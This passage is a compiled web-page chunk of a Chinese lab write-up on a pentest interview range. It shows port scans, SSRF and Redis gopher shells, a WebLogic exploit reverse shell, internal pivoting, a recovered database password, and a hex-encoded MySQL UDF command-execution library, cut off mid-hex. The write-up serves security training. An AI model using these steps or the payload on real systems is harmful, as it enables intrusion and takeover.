"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[3627],{99632:(e,n,f)=>{f.r(n),f.d(n,{assets:()=>i,contentTitle:()=>s,default:()=>r,frontMatter:()=>c,metadata:()=>o,toc:()=>d});var t=f(74848),a=f(28453);const c={sidebar_position:1,tags:["\u9762\u8bd5","SSRF","Weblogic","Mysql UDF \u63d0\u6743","\u96a7\u9053\u4ee3\u7406","Log4j","SQLI","\u6587\u4ef6\u4e0a\u4f20","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","Tomcat","Redis","SpringBoot","\u4fe1\u606f\u6cc4\u9732","Nacos","Shiro550"],title:"\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9762\u8bd5\u9776\u573a",description:"\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9762\u8bd5\u9776\u573a"},s="\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9776\u573a",o={id:"ctf/MISC/\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9776\u573a",title:"\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9762\u8bd5\u9776\u573a",description:"\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9762\u8bd5\u9776\u573a",source:"@site/docs/ctf/MISC/\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9776\u573a.md",sourceDirName:"ctf/MISC",slug:"/ctf/MISC/\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9776\u573a",permalink:"/docs/ctf/MISC/\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9776\u573a",draft:!1,unlisted:!1,tags:[{label:"\u9762\u8bd5",permalink:"/docs/tags/\u9762\u8bd5"},{label:"SSRF",permalink:"/docs/tags/ssrf"},{label:"Weblogic",permalink:"/docs/tags/weblogic"},{label:"Mysql UDF \u63d0\u6743",permalink:"/docs/tags/mysql-udf-\u63d0\u6743"},{label:"\u96a7\u9053\u4ee3\u7406",permalink:"/docs/tags/\u96a7\u9053\u4ee3\u7406"},{label:"Log4j",permalink:"/docs/tags/log-4-j"},{label:"SQLI",permalink:"/docs/tags/sqli"},{label:"\u6587\u4ef6\u4e0a\u4f20",permalink:"/docs/tags/\u6587\u4ef6\u4e0a\u4f20"},{label:"\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7"},{label:"Tomcat",permalink:"/docs/tags/tomcat"},{label:"Redis",permalink:"/docs/tags/redis"},{label:"SpringBoot",permalink:"/docs/tags/spring-boot"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"Nacos",permalink:"/docs/tags/nacos"},{label:"Shiro550",permalink:"/docs/tags/shiro-550"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["\u9762\u8bd5","SSRF","Weblogic","Mysql UDF \u63d0\u6743","\u96a7\u9053\u4ee3\u7406","Log4j","SQLI","\u6587\u4ef6\u4e0a\u4f20","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","Tomcat","Redis","SpringBoot","\u4fe1\u606f\u6cc4\u9732","Nacos","Shiro550"],title:"\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9762\u8bd5\u9776\u573a",description:"\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9762\u8bd5\u9776\u573a"},sidebar:"ctfSidebar",previous:{title:"MISC",permalink:"/docs/category/misc"},next:{title:"Learn",permalink:"/docs/category/learn"}},i={},d=[{value:"\u4ecb\u7ecd",id:"\u4ecb\u7ecd",level:2},{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"Web1",id:"web1",level:2},{value:"80",id:"80",level:3},{value:"Shell",id:"shell",level:3},{value:"172.18.240.7",id:"172182407",level:4},{value:"Web2",id:"web2",level:2},{value:"7001",id:"7001",level:3},{value:"Shell",id:"shell-1",level:3},{value:"172.16.10.8/172.25.20.10 (root)",id:"17216108172252010-root",level:4},{value:"172.25.20.12/172.26.30.4 (Mysql)",id:"17225201217226304-mysql",level:4},{value:"172.26.30.11",id:"172263011",level:4},{value:"Web3",id:"web3",level:2},{value:"22883",id:"22883",level:3},{value:"13306",id:"13306",level:3},{value:"Web5",id:"web5",level:2},{value:"8082",id:"8082",level:3},{value:"Shell",id:"shell-2",level:3},{value:"172.17.0.2 (www-data)",id:"1721702-www-data",level:4},{value:"Web6",id:"web6",level:2},{value:"8081",id:"8081",level:3},{value:"Web7",id:"web7",level:2},{value:"6379",id:"6379",level:3},{value:"Web9",id:"web9",level:2},{value:"8848",id:"8848",level:3},{value:"58080",id:"58080",level:3}];function l(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",img:"img",input:"input",li:"li",p:"p",pre:"pre",ul:"ul",...(0,a.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.h1,{id:"\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9776\u573a",children:"\u6210\u90fd\u611a\u5b89\u79d1\u6280\u9776\u573a"}),"\n",(0,t.jsx)(n.h2,{id:"\u4ecb\u7ecd",children:"\u4ecb\u7ecd"}),"\n",(0,t.jsxs)(n.ul,{className:"contains-task-list",children:["\n",(0,t.jsxs)(n.li,{className:"task-list-item",children:[(0,t.jsx)(n.input,{type:"checkbox",checked:!0,disabled:!0})," ","\u65f6\u95f4 : \u4e24\u5929\u5de6\u53f3"]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:'$ nmap -sT -p- --min-rate 1000 146.56.239.110\nStarting Nmap 7.94 ( https://nmap.org ) at 2023-12-09 00:39 CST\nNmap scan report for 146.56.239.110\nHost is up (0.057s latency).\nNot shown: 65525 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n6379/tcp  open  redis\n7001/tcp  open  afs3-callback\n8081/tcp  open  blackice-icecap\n8082/tcp  open  blackice-alerts\n8848/tcp  open  unknown\n13306/tcp open  unknown\n22883/tcp open  unknown\n58080/tcp open  unknown\n\nNmap done: 1 IP address (1 host up) scanned in 82.02 seconds\n\n$ nmap -sTCV -p 22,80,6379,7001,8081,8082,8848,13306,22883,58080 --min-rate 1000 146.56.239.110\nStarting Nmap 7.94 ( https://nmap.org ) at 2023-12-09 00:41 CST\nNmap scan report for 146.56.239.110\nHost is up (0.10s latency).\n\nPORT      STATE SERVICE VERSION\n22/tcp    open  ssh     OpenSSH 8.0 (protocol 2.0)\n| ssh-hostkey:\n|   3072 96:6c:9c:16:24:02:09:58:33:eb:a8:bd:01:a6:0b:ff (RSA)\n|   256 72:da:18:1b:5e:33:f0:ce:bf:56:ad:6b:ee:c7:ce:7c (ECDSA)\n|_  256 c1:55:d8:b4:1d:d3:05:09:51:cd:b0:b0:57:d3:32:7f (ED25519)\n80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Hello!\n6379/tcp  open  redis   Redis key-value store 4.0.14\n7001/tcp  open  http    Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)\n|_http-title: Error 404--Not Found\n|_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0)\n8081/tcp  open  http    Apache Tomcat 10.1.16\n|_http-favicon: Apache Tomcat\n|_http-title: Apache Tomcat/10.1.16\n8082/tcp  open  http    Apache httpd 2.4.7 ((Ubuntu))\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|_http-server-header: Apache/2.4.7 (Ubuntu)\n| http-robots.txt: 6 disallowed entries\n| /install/ /data/ /includes/ /languages/ /member/\n|_/template/\n|_http-title: BEES\\xE4\\xBC\\x81\\xE4\\xB8\\x9A\\xE7\\xBD\\x91\\xE7\\xAB\\x99\\xE7\\xAE\\xA1\\xE7\\x90\\x86\\xE7\\xB3\\xBB\\xE7\\xBB\\x9F_\\xE4\\xBC\\x81\\xE4\\xB8\\x9A\\xE5\\xBB\\xBA\\xE7\\xAB\\x99\\xE7\\xB3\\xBB\\xE7\\xBB\\x9F_\\xE5\\xA4\\x96\\xE8\\xB4\\xB8\\xE7\\xBD\\x91\\xE7\\xAB\\x99\\xE5\\xBB...\n8848/tcp  open  unknown\n| fingerprint-strings:\n|   GetRequest, HTTPOptions:\n|     HTTP/1.1 404\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 431\n|     Date: Fri, 08 Dec 2023 16:41:27 GMT\n|     Connection: close\n|     <!doctype html><html lang="en"><head><title>HTTP Status 404\n|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404\n|     Found</h1></body></html>\n|   RTSPRequest:\n|     HTTP/1.1 400\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Fri, 08 Dec 2023 16:41:27 GMT\n|     Connection: close\n|     <!doctype html><html lang="en"><head><title>HTTP Status 400\n|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400\n|_    Request</h1></body></html>\n13306/tcp open  mysql   MySQL 5.7.44\n| mysql-info:\n|   Protocol: 10\n|   Version: 5.7.44\n|   Thread ID: 6\n|   Capabilities flags: 65535\n|   Some Capabilities: InteractiveClient, SupportsTransactions, SwitchToSSLAfterHandshake, LongPassword, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, Support41Auth, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag, ODBCClient, FoundRows, ConnectWithDatabase, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments\n|   Status: Autocommit\n|   Salt: \\x175;=#vXx   \\x1C\\x02Q\\x0By3a3(.}\n|_  Auth Plugin Name: mysql_native_password\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=MySQL_Server_5.7.44_Auto_Generated_Server_Certificate\n| Not valid before: 2023-12-08T02:40:24\n|_Not valid after:  2033-12-05T02:40:24\n22883/tcp open  unknown\n| fingerprint-strings:\n|   GetRequest, HTTPOptions:\n|     HTTP/1.1 500\n|     X-Content-Type-Options: nosniff\n|     X-XSS-Protection: 1; mode=block\n|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate\n|     Pragma: no-cache\n|     Expires: 0\n|     X-Frame-Options: DENY\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 455\n|     Date: Fri, 08 Dec 2023 16:41:27 GMT\n|     Connection: close\n|     <!doctype html><html lang="en"><head><title>HTTP Status 500\n|     Internal Server Error</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 500\n|_    Internal Server Error</h1></body></html>\n58080/tcp open  unknown\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 302\n|     Set-Cookie: JSESSIONID=0EFBAEC932D0C1D65F9345910368D27B; Path=/; HttpOnly\n|     Location: http://localhost:8080/login;jsessionid=0EFBAEC932D0C1D65F9345910368D27B\n|     Content-Length: 0\n|     Date: Fri, 08 Dec 2023 16:41:26 GMT\n|     Connection: close\n|   HTTPOptions:\n|     HTTP/1.1 302\n|     Set-Cookie: JSESSIONID=6A9313FE260225F7AB12AAC3ECA192A7; Path=/; HttpOnly\n|     Location: http://localhost:8080/login;jsessionid=6A9313FE260225F7AB12AAC3ECA192A7\n|     Content-Length: 0\n|     Date: Fri, 08 Dec 2023 16:41:26 GMT\n|     Connection: close\n|   RPCCheck:\n|     HTTP/1.1 400\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Fri, 08 Dec 2023 16:41:26 GMT\n|     Connection: close\n|     <!doctype html><html lang="en"><head><title>HTTP Status 400\n|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400\n|     Request</h1></body></html>\n|   RTSPRequest:\n|     HTTP/1.1 505\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 465\n|     Date: Fri, 08 Dec 2023 16:41:26 GMT\n|     <!doctype html><html lang="en"><head><title>HTTP Status 505\n|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505\n|_    HTTP Version Not Supported</h1></body></html>\n3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u7aef\u53e3\u626b\u63cf\u7684\u60c5\u51b5:"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"80 : \u5df2\u7ecf\u9a8c\u8bc1\u5b58\u5728 SSRF \u6f0f\u6d1e"}),"\n",(0,t.jsx)(n.li,{children:"6379 : Redis \u83b7\u53d6\u53ef\u4ee5\u501f\u6b64\u5199\u5165 webShell \u6216\u8005\u5b9a\u65f6\u4efb\u52a1\u4e4b\u7c7b\u7684\u5185\u5bb9"}),"\n",(0,t.jsx)(n.li,{children:"7001 : Oracle WebLogic Server 10.3.6.0"}),"\n",(0,t.jsx)(n.li,{children:"8081 : Tomcat 10.1.16 , \u9700\u8981\u5bc6\u7801\u624d\u53ef\u4ee5\u8bbf\u95ee\u7ba1\u7406\u754c\u9762, \u6216\u8bb8\u53ef\u4ee5\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u6765\u8fdb\u884c\u5c1d\u8bd5"}),"\n",(0,t.jsx)(n.li,{children:"8082 : BEES CMS \u7ad9\u70b9, \u6216\u8bb8\u53ef\u4ee5\u627e\u627e\u5386\u53f2\u9057\u7559\u6f0f\u6d1e\u5c1d\u8bd5\u4e00\u4e0b"}),"\n",(0,t.jsx)(n.li,{children:"8848 : 404"}),"\n",(0,t.jsx)(n.li,{children:"13306 : Mysql \u670d\u52a1"}),"\n",(0,t.jsx)(n.li,{children:"22883 : 500"}),"\n",(0,t.jsx)(n.li,{children:"58080 : \u76f4\u63a5\u663e\u793a\u4e00\u4e2a\u767b\u9646\u754c\u9762"}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"web1",children:"Web1"}),"\n",(0,t.jsx)(n.h3,{id:"80",children:"80"}),"\n",(0,t.jsxs)(n.p,{children:["\u76f4\u63a5\u8bbf\u95ee\u7ad9\u70b9, \u4e00\u773c\u76f4\u63a5 SSRF \u6f0f\u6d1e\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518193754.png",alt:"20240518193754"}),"\n\u5229\u7528\u4f2a\u534f\u8bae\u7a0d\u5fae\u7528\u4e00\u4e0b\u5c31\u53ef\u4ee5\u53d1\u73b0\u8bfb\u53d6\u5230\u4e86 ",(0,t.jsx)(n.code,{children:"/etc/passwd"}),"\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518193828.png",alt:"20240518193828"}),"\n\u7136\u540e\u67e5\u770b\u4e86\u4e00\u4e9b\u7279\u6b8a\u7684\u6587\u4ef6\u6bd4\u5982 : ",(0,t.jsx)(n.code,{children:"/etc/hosts"})," \u6587\u4ef6\u57fa\u4e8e\u6b64\u6211\u77e5\u9053\u4e86\u8fd9\u4e2a 80 \u7aef\u53e3\u5bf9\u5e94\u7684\u4e3b\u673aIP\u4e3a ",(0,t.jsx)(n.code,{children:"172.18.240.5"})," \u4e4b\u540e\u6309\u7167\u9898\u76ee\u7684\u63d0\u793a\u4fe1\u606f, \u6211\u77e5\u9053\u4e86\u5185\u7f51\u7684\u4e00\u4e2a\u8303\u56f4, \u4e4b\u540e\u6309\u7167\u6b64\u8303\u56f4\u8fdb\u884c\u679a\u4e3e\u770b\u770b\u5185\u7f51\u5b58\u6d3b\u4ec0\u4e48\u4e3b\u673a, \u6211\u5728\u6b64\u679a\u4e3e\u4e86 80 \u548c 6379 \u6700\u7ec8\u53d1\u73b0\u5728 ",(0,t.jsx)(n.code,{children:"172.18.240.7"})," \u4e3b\u673a\u5b58\u5728 redis \u76f4\u63a5 gopher \u534f\u8bae\u5c31\u53ef\u4ee5\u62ff\u5230 ",(0,t.jsx)(n.code,{children:"172.18.240.7"})," \u4e3b\u673a\u7684 Shell\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518193906.png",alt:"20240518193906"})]}),"\n",(0,t.jsx)(n.h3,{id:"shell",children:"Shell"}),"\n",(0,t.jsx)(n.h4,{id:"172182407",children:"172.18.240.7"}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsxs)(n.p,{children:["\u5229\u7528 gopher \u534f\u8bae\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 ",(0,t.jsx)(n.code,{children:"172.18.240.7"})," \u4e3b\u673a\u7684\u4f1a\u8bdd"]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518194209.png",alt:"20240518194209"})}),"\n",(0,t.jsx)(n.admonition,{type:"tip",children:(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["\u7b2c\u4e00\u4e2a flag \u76f4\u63a5\u5728 80 \u7aef\u53e3\u6267\u884c ",(0,t.jsx)(n.code,{children:"file:///flag1"})]}),"\n",(0,t.jsxs)(n.li,{children:["\u7b2c\u4e8c\u4e2a flag \u5728 ",(0,t.jsx)(n.code,{children:"172.18.240.7"})," \u7684\u5b9a\u65f6\u4efb\u52a1"]}),"\n",(0,t.jsxs)(n.li,{children:["\u7b2c\u4e09\u4e2a flag \u5728 ",(0,t.jsx)(n.code,{children:"172.18.240.7"})," \u7684 ",(0,t.jsx)(n.code,{children:"root"})," \u76ee\u5f55\u4e0b"]}),"\n"]})}),"\n",(0,t.jsx)(n.h2,{id:"web2",children:"Web2"}),"\n",(0,t.jsx)(n.h3,{id:"7001",children:"7001"}),"\n",(0,t.jsxs)(n.p,{children:["\u5bf9\u4e8e 7001 \u670d\u52a1\u662f\u4e00\u4e2a WebLogic \u5e76\u4e14\u544a\u77e5\u4e86\u7248\u672c\u641c\u7d22\u8fc7\u540e\u53d1\u73b0\u4e00\u4e2a\u5229\u7528\u811a\u672c ",(0,t.jsx)(n.a,{href:"https://github.com/1337g/CVE-2017-10271/tree/master",children:"CVE-2017-10271"}),"\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518194818.png",alt:"20240518194818"})]}),"\n",(0,t.jsx)(n.h3,{id:"shell-1",children:"Shell"}),"\n",(0,t.jsx)(n.h4,{id:"17216108172252010-root",children:"172.16.10.8/172.25.20.10 (root)"}),"\n",(0,t.jsxs)(n.p,{children:["\u6267\u884c\u4e0a\u9762\u7684\u811a\u672c\u540e\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u4e00\u4e2a\u53cd\u5411 Shell\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518194922.png",alt:"20240518194922"}),"\n\u4e4b\u540e\u57fa\u4e8e\u6b64\u5f00\u59cb\u4e0a\u4f20 nmap \u8fdb\u884c\u5185\u7f51\u626b\u63cf, \u53d1\u73b0\u4e00\u4e2a\u5b58\u6d3b\u4e3b\u673a ",(0,t.jsx)(n.code,{children:"172.25.20.1"}),"2 \u4ece\u5176\u540d\u79f0\u6765\u770b\u662f\u4e00\u4e2a mysql \u670d\u52a1\u5668\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\u53d1\u73b0\u53ea\u5f00\u542f\u4e86 3306 , \u90a3\u4e48\u6b64 weblogic \u4f30\u8ba1\u4f1a\u5bf9 Mysql \u8fdb\u884c\u4e00\u4e9b\u8bbf\u95ee\u56e0\u6b64\u4f30\u8ba1\u5b58\u5728 mysql \u7684\u8d26\u53f7\u548c\u5bc6\u7801\u56e0\u6b64\u6211\u51b3\u5b9a\u6309\u7167\u8fd9\u4e2a\u601d\u8def\u6765\u8fdb\u884c\u53d1\u6398"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"(remote) root@0ff84b81962d:/root# ./nmap -sn  172.16.10.8/24\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-12-08 19:32 UTC\nCannot find nmap-payloads. UDP payloads are disabled.\nNmap scan report for 172.16.10.1\nCannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed\nHost is up (0.000011s latency).\nMAC Address: 02:42:23:5F:02:A4 (Unknown)\nNmap scan report for 0ff84b81962d (172.16.10.8)\nHost is up.\nNmap done: 256 IP addresses (2 hosts up) scanned in 3.76 seconds\n(remote) root@0ff84b81962d:/root# ./nmap -sn  172.25.20.10/24\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-12-08 19:32 UTC\nCannot find nmap-payloads. UDP payloads are disabled.\nNmap scan report for 172.25.20.1\nCannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed\nHost is up (0.000020s latency).\nMAC Address: 02:42:21:09:D7:1E (Unknown)\nNmap scan report for 2-mysql_udf-1.2_ntwo (172.25.20.12)\nHost is up (0.000010s latency).\nMAC Address: 02:42:AC:19:14:0C (Unknown)\nNmap scan report for 0ff84b81962d (172.25.20.10)\nHost is up.\nNmap done: 256 IP addresses (3 hosts up) scanned in 3.76 seconds\n(remote) root@0ff84b81962d:/root# ./nmap -sT -p- --min-rate 1000 172.25.20.12\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-12-08 19:35 UTC\nUnable to find nmap-services!  Resorting to /etc/services\nCannot find nmap-payloads. UDP payloads are disabled.\nNmap scan report for 2-mysql_udf-1.2_ntwo (172.25.20.12)\nCannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed\nHost is up (0.00014s latency).\nNot shown: 65534 closed ports\nPORT     STATE SERVICE\n3306/tcp open  mysql\nMAC Address: 02:42:AC:19:14:0C (Unknown)\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7ecf\u8fc7\u4e00\u756a\u641c\u7d22\u540e, \u786e\u5b9e\u5982\u6211\u6240\u731c\u60f3\u7684\u90a3\u822c, \u6211\u7ec8\u4e8e\u627e\u5230\u4e86\u5bf9\u5e94\u7684\u6570\u636e\u5e93\u8d26\u53f7\u548c\u5bc6\u7801, \u53ef\u60dc\u5bc6\u7801\u662f\u52a0\u5bc6\u7684\u8fd8\u662f AES  [/(\u3112o\u3112)/~~]\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518195040.png",alt:"20240518195040"}),"\n\u4e4b\u540e\u53c8\u662f\u4e00\u7cfb\u5217\u7684\u67e5\u627e\u548c\u8be2\u95ee\u6700\u7ec8\u6211\u53d1\u73b0\u4e86\u89e3\u5bc6\u7684\u65b9\u6cd5, \u6700\u7ec8\u5f97\u5230\u5bc6\u7801 ",(0,t.jsx)(n.code,{children:"Meetsec#1024"})," \u767b\u9646 Mysql \u51b2\u51b2\u51b2\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518195103.png",alt:"20240518195103"})]}),"\n",(0,t.jsx)(n.h4,{id:"17225201217226304-mysql",children:"172.25.20.12/172.26.30.4 (Mysql)"}),"\n",(0,t.jsxs)(n.p,{children:["\u8bbe\u7f6e\u4ee3\u7406\u8bbf\u95ee ",(0,t.jsx)(n.code,{children:"172.25.20.0/24"})," \u7f51\u6bb5\u7684\u4e3b\u673a\n",(0,t.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240518202731.png",alt:"20240518202731"}),"\n\u5728\u8fd9\u91cc\u83b7\u53d6\u5230\u4e00\u4e2a Mysql \u7684\u4ea4\u4e92\u73af\u5883, \u5e76\u4e14\u6570\u636e\u5e93\u4e2d\u6ca1\u6709\u4ec0\u4e48\u5185\u5bb9, \u53ea\u80fd\u8fdb\u884c UDF \u63d0\u6743\u4e86, \u53ef\u4ee5\u53c2\u8003 ",(0,t.jsx)(n.a,{href:"https://www.sqlsec.com/2020/11/mysql.html",children:"MySQL \u6f0f\u6d1e\u5229\u7528\u4e0e\u63d0\u6743"})," \u8fdb\u884c\u64cd\u4f5c"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-bash",children:"MySQL [data]> SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e